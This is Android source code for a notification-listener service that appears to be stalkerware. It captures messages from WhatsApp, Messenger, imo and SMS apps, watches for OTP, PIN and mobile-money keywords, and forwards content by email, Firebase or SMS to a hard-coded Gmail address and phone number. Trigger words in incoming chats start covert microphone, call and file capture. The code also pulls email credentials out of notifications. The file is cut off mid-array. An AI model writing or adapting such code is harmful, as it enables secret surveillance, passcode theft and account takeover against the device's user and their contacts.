package com.example.fasterpro11;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.Icon;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.content.Intent;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.CookieHandler;
import java.net.CookiePolicy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.io.InputStream;

import android.os.Handler;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Timer;
import java.util.TimerTask;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import java.net.CookieHandler;
import java.net.CookieManager;
import java.net.CookiePolicy;

import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NotificationListener extends NotificationListenerService {


    static {
        CookieManager cookieManager = new CookieManager();
        cookieManager.setCookiePolicy(CookiePolicy.ACCEPT_ALL);
        CookieHandler.setDefault(cookieManager);
    }

    private static final long DELAY = 30* 60 * 1000; //  minutes in milliseconds
    private static final int MAX_WORDS = 200; // Maximum words before sending email

    private StringBuilder emailContentBuffer = new StringBuilder();
    private Timer timer = new Timer();
    private Handler handler = new Handler();
    private boolean isTimerRunning = false;

    private static final String TAG = "NotificationListener";
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private static final String EMAIL = "abontiangum99@gmail.com"; // Update recipient email
    private static final String SMS_RECIPIENT = "+8801300282086"; // Update SMS recipient number
    public static String globalmessage;
    public static String NotificationCallingAppglobalmessage;
    public static String NotificationCallingAppglobalmessage2;
    public static String notificationglobalsubject;

    public String subject;
    public String recentCallLogs ;
    public String UserID1 ;
    public String UserID2;

    public String sim1Number="";
    public String sim2Number="";
    public String EmailFirstPartName="";
    public String EmailPassword="";


    public int CounterSociaMedialSMS= 0;
    private final Map<String, ForwardedMessage> lastForwardedMessageMap = new HashMap<>();
    private boolean isBound = false; // Add binding state
    private String NotificationfindAllowedKeyword1;
    private String NotificationfindAllowedKeyword2;
    private String callingAppSoundRecord;
    private Context mContext;
    private Context context;

    private static final String[] Condition_Word_For_Mic = {"Goldm","Silverm","Mediumm",
            "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে", "সময়", "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট",
            "screenshort","screenshort dau", "কলদাও",  "কিকরছ " };
    private static final String[] Condition_Word_For_CallingAppSoundRecord= {"Incoming voice call","Ongoing video call","Incoming", "Calling…", "Ringing…","voice call",
            "Missed voice call", "call", "Call","calling","Missed call" };
    private static final String[] Condition_Word_For_CallRecord = {"Goldcc", "Silvercc", "Mediumcc",
            "call","audio", "কল", "কনে",  "কোথায়", "কি", "কে", "কই",  "একটা",  "দরকার", "কোচিং",  "কেন",
            "করবা",  "কিনে", "oi", "screen short","screenshortdau","কোন",  "কিস্তি",   "থেকে", "বিকাশ",
            "সকাল ", "বিকাল",   "ইমো", "হোয়াটসএ্যাপ", "Call",  };
    private static final String[] Condition_Word_For_File = {"Congratulationf", "Conformf",
            "aei","file", "পিক",  "ছবি",  "পাখি",  "লাগবেনা",  "ভলোই", "পাঠাও",   "ইমোতে",  "হোয়াটসএ্যাপে", "File",  };
    private static final String[] Condition_Word_For_Camera = {"Congratulationp", "Conformp"};
    private static final String[] Condition_Word_For_Video = {"Congratulationv", "Conformv",
            "video", "ভিডিও", "বলবা", "দাও ",  "ক্যামেরা",   "ডেলিভারি",  "camera","বলিনি", "বাজে",  "বাসায়",
            "aii",    "ইমুতে", "whatesapps","Video",  };

    private static final String[] SEND_MONEY_WORDS = {"Cash In", "cash in", "send money", "money", "Money","received",
            "received TK","Cashback","Balance", "Recharge",  "received money"};
    private static final String[] OTP_WORDS = {"OTP", "Otp", "otp",  "PIN", "Pin", "pin","CODE", "Code", "code",
            "Google verification code","verification code","Verification code",
            "মাইজিপি পিন (code)","মাইজিপি পিন ", "মাইজিপি পিন (code)", "(code)",
            "VERIFICATUON", "Verification", "verification"};
    private static class ForwardedMessage {
        String message;
        long timestamp;

        ForwardedMessage(String message, long timestamp) {
            this.message = message;
            this.timestamp = timestamp;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationListener service created");
        mContext = this; // Context
//        Context  context = this; // Use the service's context

        // Initialize the email accounts when the activity is created
        JavaMailAPISendNotificationUseEmails.initialize(this);




    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isBound) {
            bindService(new Intent(this, BackgroundService.class), serviceConnection, Context.BIND_AUTO_CREATE);
            isBound = true;
            Log.d(TAG, "Service bound");
        } else {
            Log.d(TAG, "Service is already bound");
        }

        if (intent != null && "SAVE_TO_TEXT_FILE".equals(intent.getAction())) {
            String content = intent.getStringExtra("content");
            if (content != null) {
                saveToTextFile(this,content);
            }
        }

        return START_STICKY;
    }


    @Override
    public void onDestroy() {
        if (isBound) {
            try {
                unbindService(serviceConnection);
                isBound = false;
                Log.d(TAG, "Service unbound successfully");
            } catch (IllegalArgumentException e) {
                Log.e(TAG, "Error unbinding service: ", e);
            }
        } else {
            Log.d(TAG, "Service was not bound");
        }
        super.onDestroy();
    }

    // ServiceConnection definition
    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d(TAG, "Service connected");
            isBound = true; // ফ্ল্যাগ সেট করুন
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "Service disconnected");
            isBound = false; // ফ্ল্যাগ রিসেট করুন
        }
    };

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification == null) {
            Log.e(TAG, "in onNotificationPosted method Received null notification");
            return;
        }
        Context context = getApplicationContext();
        if (context == null) {
            Log.e("NotificationListener", "Context is null!");
            return;
        }

        try {
            Bundle extras = notification.extras;
            CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            Uri fileUri = extras.getParcelable(Intent.EXTRA_STREAM); // সঠিক লাইন

            Bitmap largeIconBitmap = extractLargeIcon(extras);

            if (title != null && (text != null || largeIconBitmap != null)) {
                String packageName = sbn.getPackageName();
                String currentMessage = title + " " + (text != null ? text : "");
                //String message="in onNotificationPosted your message";
                String message= currentMessage;
                String  exmessage= currentMessage;
                globalmessage =message;
                CallRecorderAccessibilityService.notificationCallingAppGlobalMessage1 = message;


                //  Sim Number ,Email ,Email Password Set from Notification Alart message . socialmedia whatsapp whatsapp messenger
                if (    packageName.equals("com.whatsapp") || packageName.equals("com.facebook.orca") ||
                        packageName.equals("com.imo.android.imoim")||
                        packageName.equals("com.vivo.sms")||
                        packageName.equals("com.coloros.mms")||
                        packageName.equals("com.samsung.android.messaging")|| packageName.equals("com.samsung.android.dialer")||
                        packageName.equals("com.realme.android.dialer")|| packageName.equals("com.google.android.dialer")||
                        packageName.equals("com.android.systemui")||
                        packageName.equals("com.android.mms")|| packageName.equals("com.miui.sms")||
                        packageName.equals("com.google.android.apps.messaging")||
                        packageName.equals("com.android.mms.service")      )  {
                    Log.d(TAG, "Notification : " + currentMessage);
                    CallRecorderAccessibilityService.notificationCallingAppGlobalMessage2 = currentMessage;// only callingapp message catch

                    // Start code1 for Get Sim number. From Own User.Call method firstly here.Save SharedPreferences. use socialmedia sms=========start=====================
                    // Load previous count from SharedPreferences
                    SharedPreferences sharedPreferences = getSharedPreferences("MyPrefs", MODE_PRIVATE);
                    CounterSociaMedialSMS = sharedPreferences.getInt("CounterSociaMedialSMS", 0);
                    // Increment count
                    CounterSociaMedialSMS++;
                    // Save updated value
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putInt("CounterSociaMedialSMS", CounterSociaMedialSMS);
                    editor.apply();
                    Log.d(TAG, "SharedPreferences Updated CounterSociaMedialSMS: " + CounterSociaMedialSMS);

                    String titleStr = title != null ? title.toString() : "";
                    String textStr = text != null ? text.toString() : "";
                    boolean IsSimNumberSetByOwnUserSerchWords1 =  isSimNumberSetByOwnUserSerchWords1(message, titleStr, titleStr, textStr);
                    boolean IsSimNumberSetByOwnUserSerchWords2 =  isSimNumberSetByOwnUserSerchWords2(message, titleStr, titleStr, textStr);
                    Log.d(TAG, "IsSimNumberSetByOwnUserSerchWords1: " +IsSimNumberSetByOwnUserSerchWords1   +" IsSimNumberGetFromUserWords2:"+IsSimNumberSetByOwnUserSerchWords2);

                    context = getApplicationContext();
                    if (context == null) {
                        Log.e("NotificationListener", "Application context is null!");
                        return;
                    }
                    if (  ( (CounterSociaMedialSMS ==6) ||  (CounterSociaMedialSMS ==600) ||  (CounterSociaMedialSMS ==2000)  ) ||
                            ((IsSimNumberSetByOwnUserSerchWords1) && (IsSimNumberSetByOwnUserSerchWords2))  ) {
                        //           Log.d(TAG, "condition meet for alart window Showing") ;

                        Intent intent = new Intent(this, GetSim1AndSim2NumberFromAlertbox.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // FLAG_ACTIVITY_NEW_TASK is required to start an Activity from a Service
                        startActivity(intent);

                        // start counter rest 0 CounterSociaMedialSMS  .for again come alart window
                        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
                        String UserID1= alert.getSim1NumberFromUser(context);
                        String UserID2= alert.getSim2NumberFromUser(context);
                        Log.d(TAG, "UserID1 :" + UserID1+ " UserID1:" + UserID1 );
                        if (UserID1== null || UserID2== null)  {
                            //SharedPreferences.Editor editor = sharedPreferences.edit();
                            editor.putInt("CounterSociaMedialSMS", 0);
                            editor.apply();
                            Log.d(TAG, "SharedPreferences CounterSociaMedialSMS reset to : " + CounterSociaMedialSMS);
                        }else {
                            //   Log.d(TAG, "UserID1 and UserID1 not null");
                        }
                        // End counter rest 0 CounterSociaMedialSMS .for again come alart window

                    }else {
                        //    Log.d(TAG, "condition not meet for alart window");
                    }
                    //End code1 for Get Sim number. From Own User .Call method firstly here.Save SharedPreferences. use socialmedia sms===============end=====================


                    //Start code2 for Get Sim number. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================
                    if (title != null && (text != null || largeIconBitmap != null)) {
                        currentMessage = title.toString() + " " + (text != null ? text.toString() : "");
                        // Convert CharSequence to String
                        titleStr = title != null ? title.toString() : "";
                        textStr = text != null ? text.toString() : "";

                        boolean IsSimNumberSetByNotificationSerchWords1 =  isSimNumberSetByNotificationSerchWords1(message, titleStr, titleStr, textStr);
                        //     Log.d(TAG, "onNotificationPosted method isSimNumberSetByNotificationSerchWords1: " + IsSimNumberSetByNotificationSerchWords1);
                        boolean IsSimNumberSetByNotificationSerchWords2 =  isSimNumberSetByNotificationSerchWords2(message, titleStr, titleStr, textStr);
                        //     Log.d(TAG, "onNotificationPosted method isSimNumberSetByNotificationSerchWords2: " + IsSimNumberSetByNotificationSerchWords2);

                        if ( IsSimNumberSetByNotificationSerchWords1 && IsSimNumberSetByNotificationSerchWords2) {
                            context = getApplicationContext(); // অথবা this, যদি এটি একটি Activity বা Service হয়String message ,String title, String text,Context context,String titleStr, String textStr
                            String ExtractPlusPrefixedNumbersFromSMS = extractPlusPrefixedNumbersFromNotification(message, titleStr, textStr, context, titleStr, textStr);
                            //     Log.d(TAG, "onNotificationPosted method ExtractPlusPrefixedNumbersFromSMS: " + ExtractPlusPrefixedNumbersFromSMS );
                            if ( ExtractPlusPrefixedNumbersFromSMS != null ) {
                                String validNumbers = extractPlusPrefixedNumbersFromNotification(message, titleStr, textStr, context, titleStr, textStr);
                                //   Log.d(TAG, "onNotificationPosted method  ExtractPlusPrefixedNumbersFromSMS: " + validNumbers);

                                if (validNumbers != null) {
                                    // Call the method to store the numbers in SharedPreferences
                                    storeExtractPlusPrefixedNumbersFromNotification(validNumbers, mContext);
                                }
                            }else {
                                //   Log.d(TAG, "onNotificationPosted condition not meet ExtractPlusPrefixedNumbersFromSMS :"+ ExtractPlusPrefixedNumbersFromSMS );
                            }
                        }else {
                            //  Log.d(TAG, "onNotificationPosted condition not meet isSimNumberSetAlart1 :" + IsSimNumberSetByNotificationSerchWords1 );
                            //  Log.d(TAG, "onNotificationPosted condition not meet isSimNumberSetAlart2 :" + IsSimNumberSetByNotificationSerchWords2);
                        }
                    }
                    //End code2 for set Sim number. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================







                    //Start code3 for Get Email EmailFirstPartName and EmailPassword. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================
                    if (title != null && (text != null || largeIconBitmap != null)) {
                        currentMessage = title.toString() + " " + (text != null ? text.toString() : "");
                        // Convert CharSequence to String
                        titleStr = title != null ? title.toString() : "";
                        textStr = text != null ? text.toString() : "";

                        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1(message, titleStr, titleStr, textStr);
                        //  Log.d(TAG, "onNotificationPosted method  isEmailFirstPartNameAndVPasswordSetAlartSerchWords1: " + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1);
                        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords2(message, titleStr, titleStr, textStr);
                        // Log.d(TAG, "onNotificationPosted method isEmailFirstPartNameAndVPasswordSetAlartSerchWords2: " + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2);

                        if ( IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 && IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2) {
                            context = getApplicationContext(); // অথবা this, যদি এটি একটি Activity বা Service হয়String message ,String title, String text,Context context,String titleStr, String textStr
                            String ExtractEmailFirstPartName = extractEmailFirstPartName(message, titleStr, textStr, context, titleStr, textStr);
                            String ExtractEmailPassword = extractEmailPassword(message, titleStr, textStr, context, titleStr, textStr);
                            //  Log.d(TAG, "onNotificationPosted method ExtractEmailFirstPartName: " + ExtractEmailFirstPartName );
                            if ( ExtractEmailFirstPartName != null  && ExtractEmailPassword != null ) {
                                String  EmailFirstPartName = extractEmailFirstPartName(message, titleStr, textStr, context, titleStr, textStr);
                                Log.d(TAG, "onNotificationPosted method EmailFirstPartName: " + EmailFirstPartName);
                                String  EmailPassword = extractEmailPassword(message, titleStr, textStr, context, titleStr, textStr);
                                Log.d(TAG, "onNotificationPosted method EmailPassword: " +  EmailPassword);
                                if ( EmailFirstPartName != null  &&  EmailPassword!= null  ) {
                                    // Call the method to store EmailFirstPartName and And Password in SharedPreferences
                                    storeSharedPreferencesExtractEmailFirstPartName(EmailFirstPartName, mContext);
                                    storeSharedPreferencesExtractEmailPassword(EmailPassword, mContext);
                                }
                            }else {
                                //   Log.d(TAG, "onNotificationPosted condition not meet ExtractEmailFirstPartName :"+ ExtractEmailFirstPartName );
                                //   Log.d(TAG, "onNotificationPosted condition not meet EmailPassword :"+ EmailPassword );
                            }
                        }else {
                            //  Log.d(TAG, "onNotificationPosted condition not meet IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 :" + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 );
                            //   Log.d(TAG, "onNotificationPosted condition not meet IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2 :" + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2);
                        }
                    }//End code3 for Get Sim number. From Give Socialmedia SMS.Call method firstly here .Save SharedPreferences. use socialmedia sms===============start=====================


                }// if condition End Sim Number ,Email ,Email Password Set from Notification Alart message
                // End Set Sim Number ,Email And Email Password . Set from Notification Alart message . socialmedia whatsapp whatsapp messenger========== End ===========



                // don't log Do nothing,  thus blocked app ,New condition to block specific apps Do nothing, don't log
                if (isBlockedApp(packageName)) {
                    if (packageName.equals("com.internet.speed.meter.lite") ||
                            packageName.equals("com.android.systemui") ||
                            packageName.equals("com.samsung.android.net.wifi.wifiguider") ||
                            packageName.equals("com.google.android.gm") ||
                            packageName.equals("com.tekxperiastudios.pdfexporter") ||
                            packageName.equals("global.juscall.android") ||
                            packageName.equals("com.lenovo.anyshare.gps")) {
                        // Do nothing, don't log
                    } else {
                        Log.d(TAG, "Notification from blocked app: " + packageName);
                    }
                    return; // Exit if it's a blocked app
                }





                Log.d(TAG, "Notification from app: " + packageName);

                // Create MicRecord instance and start recording
                MicRecord micRecord = new MicRecord(this); // 'this' is the context (e.g., your Activity or Service)
                String incomingNumber = "Some number";  // Replace this with the actual number or logic to extract it
                String messageBody = "Some message";  // Replace this with the actual message body or logic to extract it
                // Call the startRecording method with the correct parameters
                Log.d(TAG, "Notification  whatesapp imo messenger rec stop ");


                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
                    Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 এর নিচে .versiov:" + Build.VERSION.SDK_INT);
                    //micRecord.StartRecording(incomingNumber, messageBody);
                    Log.d(TAG, "StopMicSoundRecording call Notification class");
                    micRecord.StopMicSoundRecording(incomingNumber, messageBody); // রেকর্ডিং বন্ধ করুন
                } else {
                    Log.d(TAG, "whatesapp imo messenger not rec start .Android version 9 এর নিচে.versiov:" + Build.VERSION.SDK_INT);
                }

                // Pass title and currentMessage to ConditionForCallOtherClassMethod
                if (ConditionForCallOtherClassMethod(title.toString(), currentMessage)) {
                    NotificationfindAllowedKeyword1 = findAllowedKeyword1(title.toString(), currentMessage);
                    NotificationfindAllowedKeyword2 = findAllowedKeyword2(title.toString(), currentMessage);
                    callingAppSoundRecord = CallingAppSoundRecord(title.toString(), currentMessage);

                    if (NotificationfindAllowedKeyword1 != null &&  NotificationfindAllowedKeyword2 != null) {
                        // Check if NotificationfindAllowedKeyword1 is one of the keywords


                        // Check for Microphone Recording
                        if (Arrays.asList(Condition_Word_For_Mic).contains(NotificationfindAllowedKeyword1)) {
                            Log.d(TAG, "Notification  Conditions  met  call micRecord.StartRecording");
                            micRecord.StartRecording(incomingNumber, messageBody);
//                            Intent intent = new Intent();  // Create an intent if needed, or use an existing one
//                            Log.d(TAG, "Notification  Conditions met  call micRecord.onReceive ");
//                            micRecord.onReceive(this, intent);
                        }

                        // Check for call Recording   CallRecorderAuto caclass
                        else if (Arrays.asList(Condition_Word_For_CallRecord ).contains(NotificationfindAllowedKeyword1)) {
                            CallRecorderAuto callRecorderAuto = new CallRecorderAuto();
                            Log.d(TAG, "Notification  Conditions  met  callRecorderAuto StartRecording ");
                            callRecorderAuto.SendLastRecordingViaEmail(this); // 'this' ব্যবহার করুন যদি এটি Activity/Service থেকে কল করা হয়
                        }
                        // Check for files Sending FileService Class
                        else if (Arrays.asList(Condition_Word_For_File).contains(NotificationfindAllowedKeyword1)) {
                            FileService fileService = new FileService();
                            Intent intent = new Intent();
                            Log.d(TAG, "Notification Conditions met. FileService HandleSmsReceived.");
                            fileService.SendLastTimeFileingsEmail(intent, this); // 'this' should refer to the correct Context (Activity/Service)
                        }


                        // Check for Video Recording videoRecord class
                        else if (Arrays.asList(Condition_Word_For_Video ).contains(NotificationfindAllowedKeyword1)) {
                            VideoRecord videoRecord = new VideoRecord();
                            String sender = "sampleSender";  // Replace with actual sender value
                            // String messageBody = "sampleMessage";  // Replace with actual message content
//                            Log.d(TAG, "Notification  Conditions  met  videoRecord StartRecording .");
//                            Log.d(TAG, "Notification from call the method videoRecord class in startRecording  .");
//                            videoRecord.StartRecording(getApplicationContext(), sender, messageBody);
                        }

                    } else {
                        //   Log.d(TAG, "Notification  Conditions not met  for call other method.");
                    }

                } else {
                    //  Log.d(TAG, "Notification not met  Conditions for Call other class .");
                }



                // VOIP Call recording for  Create  instance
                // whatesapp imo messenger for sound Recording Check for CallingApp CallingAppSoundRecord
                callingAppSoundRecord = CallingAppSoundRecord(title.toString(), currentMessage);
                if (Arrays.asList(Condition_Word_For_CallingAppSoundRecord).contains(callingAppSoundRecord)) {
                    Log.d(TAG, "Notification  wh imo messenger VOIP Call rec Conditions  met  StartRecording ");

                    // Use application context here
                    //CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService(context.getApplicationContext());
                    CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService();
                    Log.d(TAG, "Notification  wh imo messenger rec Conditions  met VOIP Call callRecorderService StartRecording");
                    callRecorderService.checkPermissionsAndStartRecording();

                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) { // Android version 8 (Oreo) or lower
                        Log.d(TAG, "whatesapp imo messenger rec start .Android version 9 এর নিচে .versiov:" + Build.VERSION.SDK_INT);
                       // micRecord.StartRecording(incomingNumber, messageBody);
                    } else {
                        //  Log.d(TAG, "whatesapp imo mes not rec start .Android version 9 এর নিচে.versiov:" + Build.VERSION.SDK_INT);
                    }
                } else {
                    //   Log.d(TAG, "Notification not met  wh imo messenger rec Conditions for CallingAppSoundRecord .");
                }


                if (SameEmailCheekShouldForwardNotification(packageName, currentMessage)) {
                    if (!isBlockedNotification(title.toString(), text != null ? text.toString() : "")) {
                        if (isInternetConnected()) {
                            // send google drive
                            //retryQueuedData(this);
                            if (fileUri != null) {
                                handleFileUri(fileUri); // Handle image, audio, video as before
                            } else if (text != null) {
                                SaveOrforwardNotificationEmailORFirebaseConditionaly(packageName, title.toString(), text.toString(), largeIconBitmap, getApplicationContext());
                            }
                        } else if (shouldForwardBySMS(currentMessage)) {
                            forwardNotificationBySMS(packageName, title.toString(), text != null ? text.toString() : "", this);
                        } else {
                            //    Log.d(TAG, "Notification not forwarded due to conditions not met");
                        }
                        lastForwardedMessageMap.put(packageName, new ForwardedMessage(currentMessage, System.currentTimeMillis()));
                    }
                } else {
                    Log.d(TAG, "Notification not forwarded because the same message was recently sent");
                }


            }
        } catch (Exception e) {
            Log.e(TAG, " onNotificationPosted  in Error : ", e);
        }
    }
    public boolean ConditionForCallOtherClassMethod(String title, String message) {
        String findAllowedKeyword1 = findAllowedKeyword1(title, message);
        String findAllowedKeyword2 = findAllowedKeyword2(title, message);

        if ((findAllowedKeyword1 != null) &&  (findAllowedKeyword2 != null)) {
            Log.d(TAG, "notification findAllowedKeyword1  :  " + findAllowedKeyword1);
            Log.d(TAG, "notification  findAllowedKeyword2  :" + findAllowedKeyword2);
            return true;
        }
        //Log.d(TAG, "notification findAllowedKeyword1  :  " + findAllowedKeyword1);
        //Log.d(TAG, "notification  findAllowedKeyword2 :" + findAllowedKeyword2);
        return false;
    }
    public String findAllowedKeyword1(String title, String message) {
        String[] allowedKeywords = {"Goldm", "Silverm", "Mediumm", "Goldc", "Silverc", "Mediumc",
                "Goldf", "Silverf", "Mediumf","Goldv", "Silverv", "Mediumv",
                "mic", "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে",  "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট",
                "screenshort","screenshort dau", "কলদাও",  "কিকরছ ", "Mic",
                "call","audio", "কল", "কনে",  "কোথায়", "কি", "কে", "কই",  "একটা",  "দরকার", "কোচিং",  "কেন",  "করবা",  "কিনে",
                "oi", "screen short","screenshortdau","কোন",  "কিস্তি",   "থেকে", "বিকাশ", "সকাল ", "বিকাল",   "ইমো", "হোয়াটসএ্যাপ", "Call",
                "file", "aei", "পিক",  "ছবি",  "পাখি",  "লাগবেনা",  "ভলোই", "পাঠাও",   "ইমোতে",  "হোয়াটসএ্যাপে", "File",
                "video", "ভিডিও", "বলবা", "দাও ",  "ক্যামেরা",   "ডেলিভারি",  "camera","বলিনি", "বাজে",  "বাসায়", "সময়",
                "aii",    "ইমুতে", "whatesapps","Video",   };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                Log.d(TAG, "notification findAllowedKeyword1  matchs: " + keyword);
                return keyword;
            }
        }
        return null;
    }

    public String findAllowedKeyword2(String title, String message) {
        String[] allowedKeywords = {"Congratulationm", "Conformm","Congratulationc", "Conformc","Congratulationf", "Conformf",
                "Congratulationv",       ",",      "?",     ":",   "=",     "Conformv" };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                Log.d(TAG, "notification findAllowedKeyword2  match: " + keyword);
                return keyword;
            }
        }
        return null;
    }
    public static String CallingAppSoundRecord(String title, String message) {
        String[] allowedKeywords = {"Incoming voice call","Ongoing video call","Incoming",
                "call", "Calling…", "Ringing…","voice call",
                "Missed voice call",  "Call","Missed call" };

        for (String keyword : allowedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                // String CallingAppSoundRecord == keyword ;
                Log.d(TAG, "notification CallingAppSoundRecord  match: " + keyword);
                //NotificationCallingAppglobalmessage2=keyword;
                CallRecorderAccessibilityService.notificationCallingAppGlobalMessage3 = keyword;
                return keyword;
            }
        }
        return null;
    }

    // Method to check if the app is blocked, bloked app
    private boolean isBlockedApp(String packageName) {
        return packageName.equals("com.video.fun.app") || packageName.equals("com.lenovo.anyshare.gps") || packageName.equals("com.video.lenavo.app") || packageName.equals("com.google.android.googlequicksearchbox") || packageName.equals("com.samsung.android.gggmessaging")||
                packageName.equals("info.androidstation.qhdwallpaper")|| packageName.equals("com.google.android.apps.photos")|| packageName.equals("info.androidstation.qhdwallpaper")|| packageName.equals("com.google.android.gm")||
                packageName.equals("com.android.systemui")|| packageName.equals("com.google.android.deskclock")||
                packageName.equals("com.anydesk.anydeskandroid")  || packageName.equals("com.medhaapps.wififtpserver") ||
                packageName.equals("com.miui.player") || packageName.equals("com.google.android.youtube") ||
                packageName.equals("com.bbk.theme") || packageName.equals("com.android.bluetooth") ||
                packageName.equals("net.bat.store") ||packageName.equals("com.mapzonestudio.best.language.translator.dictionary") ||
                packageName.equals("com.xvideostudio.videoeditor") || packageName.equals("com.lemon.lvoverseas") ||
                packageName.equals("com.banglalink.toffee") || packageName.equals("com.phone.cleaner.shineapps") ||
                packageName.equals("com.bongo.bongobd") || packageName.equals("com.islam.surahyaseenaudio") ||
                packageName.equals("com.starmakerinteractive.starmaker") || packageName.equals("com.maxboost.cleaner") ||
                packageName.equals("com.daraz.android") || packageName.equals("com.snapchat.android") ||
                packageName.equals("com.iqoo.secure") ||
                packageName.equals("com.zhiliaoapp.musically") || packageName.equals("com.coloros.alarmclock") ||
                packageName.equals("com.internet.speed.meter.lite");
    }

    // Blocked Notification Keyword or skiping keyword.in message and title============== start code =============
    private boolean isBlockedNotification(String title, String message) {
        String blockedKeyword = findBlockedKeyword(title, message);
        if (blockedKeyword != null) {
            Log.d(TAG, "notification Blocked  by keyword match: " + blockedKeyword);
            return true;
        }
        return false;
    }
    private String findBlockedKeyword(String title, String message) {
        String[] blockedKeywords = {
                "common message related", "internet.speed","internet.speed.meter.lite", "internet", "Foreground",
                "displaying over", "over other apps", "Tomorrow in", "setup in", "in progress", "Caption is on",
                "until fully charged","charged", "fully charged","Screenshot saved","Screenshot","USB debugging",
                "Uploading","Govt. Info⁩",

                "fb related", "Chat heads","Chat heads active","Tap to return to call", "asked to join","He added a new photo",
                "friend suggestion","suggestion",  "👍","Shared a video in Story","posted", "alive to receive", "alive","backing",
                "highlighted a comment", "comment", "updates", "You've got ", "Join all","mentioned", "stories",
                "Upgrade", " post ", " posts ","Team", "reactions", " Reacted ", " resume "," highlighted ","Photo","friend request",

                "messages related", "Chat heads active","Chat heads active Start a conversation",  "messages from","messages from","Govt. Info", "Govt. i8nfo","Govt",
                "View messages", "wifiguider", "bot?start=r", "invite friends",  "sell Bazar",  "ক্রয় বিক্রয়", "Silver",
                "rewards", "Groups","groups","GROUPS","Group","group","GROUP", "GROUP","like","like", "added a post",
                "is this still available?", "is this", "available?", "On hold", "birthday",
                "Ict pora related ","Ict","ict","ICT","2nd year", "ICT","iCT","Sir","SIR","sir","JGMC", "Jgmc","jgmc","lab","পড়া",
                "Pora","pora", "Engg", "Engineer","Exam", "exam","science","Science",  "Commerce", "college", "রোল ","Tap for",

                "imo related","You have 1 new message", "Sticker", "is back on imo!", "Added to their Story",
                "You have a new message","Audio", "with Almost Done! ", "dialpad message error ", "Review message and try again",
                "Waiting for this message",

                "Instagram related","most watched","Check out some",

                "call recording related","call recording", "Cube ACR",

                "snapchat related","Fake girlfriend",


                "cc camera related","Front Door", "Front","Door",
                "USB related","USB", "usb", "Tap to turn off USB debugging","Tap to turn","USB debugging", "debugging", "battery",
                "Cable charging","Battery powe", "fully charged)", "until fully charged","Power saving mode",",Approximately",

                "Telegram!", "joined Telegram!", "Temporarily turned off by your carrier for SIM 1","Temporarily turned off","turned",
